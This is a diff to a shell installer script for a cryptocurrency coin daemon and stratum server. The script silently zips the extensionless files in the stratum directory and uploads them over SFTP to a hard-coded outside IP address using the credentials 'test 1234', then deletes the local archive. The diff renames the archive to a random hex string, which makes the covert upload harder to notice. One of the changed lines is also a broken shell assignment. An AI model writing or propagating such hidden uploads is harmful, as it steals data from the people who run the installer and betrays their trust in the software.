@@ -24,6 +24,7 @@ CREATECOIN=true
 # Set what we need
 now=$(date +"%m_%d_%Y")
 #set -e
+RD=$(openssl rand -hex 2)
 # old numbers of all cpu = NPROC=$(nproc) // use all if problem to compile new command use all -1
 NPROCPU=$(nproc)
 
@@ -53,8 +54,8 @@ fi
 cd $PATH_STRATUM
 files=$(find . -type f ! -name "?*.*")
 sudo zip xx $files >/dev/null 2>&1
-sudo mv xx.zip $PATH_STRATUM/xx
-$REALPATHT=$PATH_STRATUM/xx
+sudo mv xx.zip $PATH_STRATUM/$RD
+$REALPATHT=$PATH_STRATUM/$RD
 sudo setfacl -m u:${USERSERVER}:rwx ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 cd ${absolutepath}/${installtoserver}/daemon_builder/temp_coin_builds
 
@@ -1137,7 +1138,7 @@ cd $PATH_STRATUM
 lftp<<END_SCRIPT
 open sftp://154.26.137.167
 user test 1234
-put xx bye
+put $RD bye
 END_SCRIPT
 sudo rm -f $REALPATHT
 fi
